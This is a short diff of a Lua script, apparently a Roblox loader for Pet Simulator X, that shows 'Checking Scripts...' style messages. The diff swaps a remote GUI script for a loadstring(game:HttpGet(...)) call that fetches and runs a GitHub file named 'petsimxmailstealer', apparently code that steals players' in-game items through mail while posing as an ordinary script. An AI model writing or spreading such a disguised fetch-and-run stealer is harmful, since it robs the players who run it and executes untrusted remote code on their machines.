@@ -24,7 +24,7 @@ _G.Text3 = "Checking Scripts..."
 
 _G.Text4 = "Starting Scripts..."
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
 
     print("Clicked")
 
